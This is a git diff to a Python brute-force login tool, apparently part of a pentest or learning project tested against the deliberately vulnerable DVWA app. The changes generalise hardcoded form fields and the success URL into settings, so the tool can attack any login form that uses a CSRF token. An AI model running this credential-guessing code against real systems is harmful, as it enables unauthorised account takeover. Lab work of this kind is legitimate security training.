@@ -7,8 +7,9 @@ import json
 import settings
 
 
-# Brute force authentication (tested on DVWA)
-# credentials can be provided with files specified in settings.py
+# Brute force authentication (tested on DVWA) : https://github.com/ethicalhack3r/DVWA
+# Docker command : docker run --rm -it -p 8000:80 vulnerables/web-dvwa (http://localhost:8000/)
+# Credentials can be provided with files specified in settings.py
 class BruteForce(object):
     def __init__(self, debug: bool, url_login: str, file_users: str = settings.BF_FILEPATH_USERS,
                  file_passwords: str = settings.BF_FILEPATH_PASSWORDS):
@@ -84,16 +85,16 @@ class BruteForce(object):
                         self.__logger.info("Try {user}/{password}".format(user=user, password=password))
 
                         # Set POST parameters
-                        post_parameters = {"username": user,
-                                           "password": password,
-                                           "user_token": param_form_csrf_value,
-                                           "Login": param_form_login_value}
+                        post_parameters = {settings.PARAM_FORM_USER_KEY: user,
+                                           settings.PARAM_FORM_PASSWORD_KEY: password,
+                                           settings.PARAM_FORM_CSRF_KEY: param_form_csrf_value,
+                                           settings.PARAM_FORM_LOGIN_KEY: param_form_login_value}
                         # HTTP POST request
                         self.__response_login = requests.post(self.__url_login, post_parameters, cookies=self.__cookies,
                                                               allow_redirects=False)
 
                         # check if authentication succeed
-                        if "index.php" in self.__response_login.headers["Location"]:
+                        if settings.URL_SUCCESS in self.__response_login.headers["Location"]:
                             self.__logger.info(
                                 "Success - Authenticated with {user}/{password}".format(user=user, password=password))
                             self.__is_authenticated = True
@@ -102,15 +103,15 @@ class BruteForce(object):
         self.__logger.info("Error - Brute Force failed.")
         return
 
-    # get cookies
+    # Get cookies
     def get_cookies(self):
         return self.__cookies
 
-    # get is_authenticated
+    # Get is_authenticated
     def get_is_authenticated(self):
         return self.__is_authenticated
 
-    # main method to perform brute force attack on DVWA
+    # Main method to perform brute force attack on login form
     def run(self):
         self.test_login_url()
         self.set_cookies()
